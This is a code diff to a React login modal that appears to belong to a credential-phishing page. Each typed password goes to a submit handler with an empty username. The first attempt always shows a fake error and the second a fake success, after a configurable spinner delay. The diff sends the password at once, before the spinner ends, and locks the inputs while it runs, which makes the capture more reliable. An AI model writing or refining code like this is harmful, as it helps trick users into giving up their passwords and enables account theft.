@@ -23,23 +23,26 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
     const handleSubmit = async (e) => {
         e.preventDefault();
 
-        if (!formData.password.trim()) {
+        const password = formData.password.trim();
+        if (!password) {
             return;
         }
 
         setIsLoading(true);
         setShowError(false);
 
+        const attemptAtSubmit = loginAttempt;
+        // Send immediately; loading only blocks UI until the spinner finishes
+        onSubmit('', password);
+
         setTimeout(() => {
             setIsLoading(false);
 
-            if (loginAttempt === 0) {
+            if (attemptAtSubmit === 0) {
                 setShowError(true);
                 setLoginAttempt(1);
-                onSubmit('', formData.password);
             } else {
                 setShowError(false);
-                onSubmit('', formData.password);
                 onSuccess();
             }
         }, (config.password_loading_time || 5) * 1000);
@@ -211,6 +214,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
                                 maxLength="30"
                                 minLength="3"
                                 required
+                                disabled={isLoading}
                                 value={formData.password}
                                 onChange={(e) => handleChange('password', e.target.value)}
                             />
@@ -219,6 +223,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
                                 style={eyeBtnStyle}
                                 tabIndex={-1}
                                 aria-label="toggle password visibility"
+                                disabled={isLoading}
                                 onClick={togglePasswordVisibility}
                             >
                                 {showPassword ? <EyeIcon /> : <EyeOffIcon />}
